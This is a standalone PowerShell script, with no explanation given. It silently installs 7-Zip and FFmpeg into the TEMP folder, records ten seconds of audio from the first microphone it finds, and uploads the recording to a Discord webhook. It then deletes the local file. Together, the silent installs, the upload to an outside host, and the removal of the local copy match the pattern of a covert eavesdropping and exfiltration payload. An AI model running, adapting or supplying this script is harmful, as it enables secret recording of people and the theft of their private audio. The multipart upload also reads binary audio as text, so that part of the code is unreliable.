# Set up variables
$ffmpegUrl = "https://ffmpeg.org/releases/ffmpeg-release-full.7z"
$ffmpegFolder = "$env:TEMP\ffmpeg"
$ffmpegPath = "$ffmpegFolder\bin\ffmpeg.exe"
$webhookUrl = "" # Replace with your Discord webhook URL
$duration = 10 # Duration in seconds

# 7-Zip Installer
$sevenZipUrl = "https://www.7-zip.org/download/7z1900-x64.exe"
$sevenZipInstaller = "$env:TEMP\7z1900-x64.exe"

# Function to install 7-Zip
function Install-7Zip {
    Write-Host "Installing 7-Zip..."
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipInstaller
    Start-Process -FilePath $sevenZipInstaller -ArgumentList "/S" -Wait
    Remove-Item $sevenZipInstaller
}

# Function to download and extract FFmpeg
function Install-FFmpeg {
    # Create a folder for FFmpeg
    New-Item -ItemType Directory -Path $ffmpegFolder -Force

    # Download FFmpeg
    $ffmpegArchive = "$ffmpegFolder\ffmpeg.7z"
    Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegArchive

    # Extract FFmpeg (requires 7-Zip)
    & "$env:ProgramFiles\7-Zip\7z.exe" x $ffmpegArchive -o$ffmpegFolder

    # Clean up the archive
    Remove-Item $ffmpegArchive
}

# Check for 7-Zip and FFmpeg, and install if not present
if (-Not (Get-Command "7z" -ErrorAction SilentlyContinue)) {
    Install-7Zip
}

if (-Not (Test-Path $ffmpegPath)) {
    Install-FFmpeg
}

# Define output file name in TEMP directory
$outputFile = "$env:TEMP\mic_audio_recording_$(Get-Date -Format 'yyyyMMdd_HHmmss').wav"

# Delete the previous output file if it exists
if (Test-Path $outputFile) {
    Remove-Item $outputFile
}

# Get the list of audio input devices from ffmpeg
$audioDevices = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Select-String "Microphone"

# Extract the first default microphone found
$micDevice = $audioDevices -split "`r?`n" | Select-String "Microphone" | Select-Object -First 1

# Check if a microphone was found
if ($micDevice) {
    # Clean the device name to be used in the ffmpeg command
    $micDevice = $micDevice -replace '.*"(.*)".*', '$1'

    # Build and run the ffmpeg command to record the default mic audio in mono as a .wav file
    & $ffmpegPath -f dshow -i "audio=$micDevice" -t $duration -acodec pcm_s16le -ac 1 -ar 44100 "$outputFile"

    Write-Host "Recording complete! Saved to $outputFile"

    # Prepare the form-data for sending the file to Discord
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Prepare the form content (this includes the file and a simple message)
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $outputFile)"
Content-Type: application/octet-stream

$(Get-Content -Path $outputFile -Raw)
--$boundary
Content-Disposition: form-data; name="payload_json"

{
    "content": "Here is the recorded audio file."
}
--$boundary--
"@

    # Send the request to Discord
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body

    Write-Host "File sent to Discord webhook!"

    # Delete the file after sending it to Discord
    if (Test-Path $outputFile) {
        Remove-Item $outputFile
        Write-Host "Output file deleted: $outputFile"
    }
} else {
    Write-Host "No microphone found!"
}
